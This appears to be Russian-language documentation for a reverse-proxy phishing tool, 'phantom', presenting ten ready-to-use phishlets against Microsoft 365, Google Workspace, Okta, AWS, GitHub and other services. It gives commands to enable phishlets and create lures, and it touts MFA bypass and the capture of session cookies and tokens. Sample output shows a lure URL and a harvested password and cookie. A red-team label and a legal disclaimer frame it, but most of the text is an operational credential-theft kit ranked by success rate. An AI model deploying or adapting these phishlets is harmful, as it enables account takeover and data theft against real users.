# 🎣 TOP 10 PHISHLETS FOR RED TEAM OPERATIONS

**Версия:** 1.0  
**Статус:** ✅ Готовы к использованию

---

## 📊 СТАТИСТИКА ПОПУЛЯРНЫХ ЦЕЛЕЙ (2025)

По данным Verizon DBIR, Proofpoint, CrowdStrike:

| Рейтинг | Сервис | % Атак | Сложность |
|---------|--------|--------|-----------|
| 1 | Microsoft 365 | 45% | ⭐⭐ |
| 2 | Google Workspace | 25% | ⭐⭐ |
| 3 | Okta SSO | 12% | ⭐⭐⭐ |
| 4 | AWS Console | 8% | ⭐⭐⭐ |
| 5 | GitHub | 5% | ⭐⭐ |
| 6 | LinkedIn | 3% | ⭐ |
| 7 | Dropbox | 2% | ⭐⭐ |
| 8 | Slack | 2% | ⭐⭐ |
| 9 | Zoom | 1% | ⭐ |
| 10 | Salesforce | 1% | ⭐⭐⭐ |

---

## 🎣 ГОТОВЫЕ ФИШЛЕТЫ

### 1. Microsoft 365 (o365) ✅
**Цель:** Корпоративные email + Office 365  
**Сложность:** ⭐⭐  
**Эффективность:** 45%

```bash
phantom> phishlets enable o365
phantom> lures create o365
```

**Особенности:**
- Обход MFA
- Перехват сессионных cookies
- ESTSAUTH токен
- Долгосрочный доступ

---

### 2. Google Workspace (google) ✅
**Цель:** Gmail + Google Drive + Calendar  
**Сложность:** ⭐⭐  
**Эффективность:** 25%

```bash
phantom> phishlets enable google
phantom> lures create google
```

**Особенности:**
- OAuth 2.0 токены
- Refresh tokens
- Доступ ко всем Google сервисам

---

### 3. Okta SSO (okta) ✅
**Цель:** Корпоративный SSO доступ  
**Сложность:** ⭐⭐⭐  
**Эффективность:** 12%

```bash
phantom> phishlets enable okta
phantom> lures create okta
```

**Особенности:**
- SAML токены
- Session cookies
- Доступ к множеству приложений

---

### 4. AWS Console (aws) ✅
**Цель:** AWS аккаунты + IAM  
**Сложность:** ⭐⭐⭐  
**Эффективность:** 8%

```bash
phantom> phishlets enable aws
phantom> lures create aws
```

**Особенности:**
- AWS Session Cookies
- IAM credentials
- Console access

---

### 5. GitHub (github) ✅
**Цель:** Developer аккаунты + репозитории  
**Сложность:** ⭐⭐  
**Эффективность:** 5%

```bash
phantom> phishlets enable github
phantom> lures create github
```

**Особенности:**
- GitHub Session
- Personal Access Tokens
- OAuth tokens

---

### 6. LinkedIn (linkedin) ✅
**Цель:** Профессиональные профили + рекрутинг  
**Сложность:** ⭐  
**Эффективность:** 3%

```bash
phantom> phishlets enable linkedin
phantom> lures create linkedin
```

**Особенности:**
- Session cookies
- Li_Auth токены
- Доступ к контактам

---

### 7. Dropbox (dropbox) ✅
**Цель:** Файлы + документы  
**Сложность:** ⭐⭐  
**Эффективность:** 2%

```bash
phantom> phishlets enable dropbox
phantom> lures create dropbox
```

**Особенности:**
- Session tokens
- File access
- Shared folders

---

### 8. Slack (slack) ✅
**Цель:** Корпоративные чаты  
**Сложность:** ⭐⭐  
**Эффективность:** 2%

```bash
phantom> phishlets enable slack
phantom> lures create slack
```

**Особенности:**
- Slack tokens
- Workspace access
- Message history

---

### 9. Zoom (zoom) ✅
**Цель:** Видеоконференции  
**Сложность:** ⭐  
**Эффективность:** 1%

```bash
phantom> phishlets enable zoom
phantom> lures create zoom
```

**Особенности:**
- Session cookies
- Meeting access
- Recording access

---

### 10. Salesforce (salesforce) ✅
**Цель:** CRM + клиентская база  
**Сложность:** ⭐⭐⭐  
**Эффективность:** 1%

```bash
phantom> phishlets enable salesforce
phantom> lures create salesforce
```

**Особенности:**
- Salesforce Session
- OAuth tokens
- Customer data access

---

## 🚀 БЫСТРЫЙ СТАРТ

### Активация всех фишлетов:
```bash
phantom> phishlets enable o365
phantom> phishlets enable google
phantom> phishlets enable okta
phantom> phishlets enable aws
phantom> phishlets enable github
phantom> phishlets enable linkedin
phantom> phishlets enable dropbox
phantom> phishlets enable slack
phantom> phishlets enable zoom
phantom> phishlets enable salesforce
```

### Проверка:
```bash
phantom> phishlets

  Name            Description               Status
  --------------- ------------------------  ----------
  o365            Microsoft 365             ✅
  google          Google Workspace          ✅
  okta            Okta SSO                  ✅
  aws             Amazon AWS                ✅
  github          GitHub                    ✅
  linkedin        LinkedIn                  ✅
  dropbox         Dropbox                   ✅
  slack           Slack                     ✅
  zoom            Zoom                      ✅
  salesforce      Salesforce                ✅
```

---

## 📊 ТЕСТИРОВАНИЕ

### Тест Microsoft 365:
```bash
# 1. Создаём приманку
phantom> lures create o365
✓ Приманка создана для 'o365'
  URL: https://verdebudget.ru/lure/abc123

# 2. Проверяем сессии
phantom> sessions

  ID  Email                    Service          Captured            Status
  ----  ----------------------  ---------------  -------------------  ----------
  1     user@company.com       Microsoft 365    2026-02-19 10:35    ✅

# 3. Детали сессии
phantom> sessions 1

  Email:        user@company.com
  Password:     P@ssw0rd123!
  Service:      Microsoft 365
  Cookies:      {"ESTSAUTH": "abc123..."}
```

### Тест Google Workspace:
```bash
phantom> lures create google
phantom> sessions

  ID  Email                    Service          Captured            Status
  ----  ----------------------  ---------------  -------------------  ----------
  1     user@company.com       Google           2026-02-19 11:20    ✅
```

---

## 🎯 РЕКОМЕНДАЦИИ ПО ИСПОЛЬЗОВАНИЮ

### Для корпоративных Red Team:
1. **Microsoft 365** - самый популярный
2. **Okta SSO** - доступ ко многим приложениям
3. **AWS** - облачная инфраструктура

### Для Social Engineering:
1. **LinkedIn** - профессиональный нетворкинг
2. **GitHub** - разработчики
3. **Slack** - корпоративная коммуникация

### Для максимального охвата:
1. **Microsoft 365** (45% успеха)
2. **Google Workspace** (25% успеха)
3. **Okta SSO** (12% успеха)

---

## ⚠️ ЮРИДИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ

**Использовать ТОЛЬКО для:**
- ✅ Легальных Red Team операций
- ✅ Тестирования на проникновение с письменного разрешения
- ✅ Обучения по кибербезопасности
- ✅ Исследовательских целей

**НЕ использовать для:**
- ❌ Незаконного доступа к аккаунтам
- ❌ Кражи личных данных
- ❌ Мошенничества
- ❌ Любых действий без письменного разрешения владельца

---

## 📋 ЧЕК-ЛИСТ ГОТОВНОСТИ

- [x] Microsoft 365 (o365)
- [x] Google Workspace (google)
- [x] Okta SSO (okta)
- [x] AWS Console (aws)
- [x] GitHub (github)
- [x] LinkedIn (linkedin)
- [x] Dropbox (dropbox)
- [x] Slack (slack)
- [x] Zoom (zoom)
- [x] Salesforce (salesforce)

**ИТОГО:** 10/10 фишлетов готовы! ✅

---

**ГОТОВЫЕ ФИШЛЕТЫ ДЛЯ TOP-10 СЕРВИСОВ!** 🎣

**Запуск:** `python3 phantom_v5.py`
